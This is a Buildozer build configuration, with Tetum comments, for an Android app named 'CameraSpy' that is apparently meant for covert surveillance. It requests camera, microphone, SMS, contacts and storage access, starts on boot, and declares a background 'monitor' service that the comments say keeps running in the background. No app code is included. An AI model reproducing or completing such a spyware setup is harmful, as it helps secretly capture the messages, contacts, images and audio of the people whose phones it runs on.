[app]
title = CameraSpy
package.name = camsnap
package.domain = org.test
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 0.1

# Aumenta pyjnius hodi bele ko'alia ho sistema Android
requirements = python3,kivy,requests,opencv-python,pyjnius

# Permisaun kompletu ba SMS, Kontak, Mic, no Auto-Start
android.permissions = INTERNET, CAMERA, RECORD_AUDIO, READ_SMS, READ_CONTACTS, WRITE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE, RECEIVE_BOOT_COMPLETED, WAKE_LOCK

orientation = portrait
fullscreen = 0
android.arch = armeabi-v7a
android.api = 33

# Service hodi app ne'e bele la'o nafatin iha background
android.services = monitor:main.py

[buildozer]
log_level = 2
warn_on_root = 1
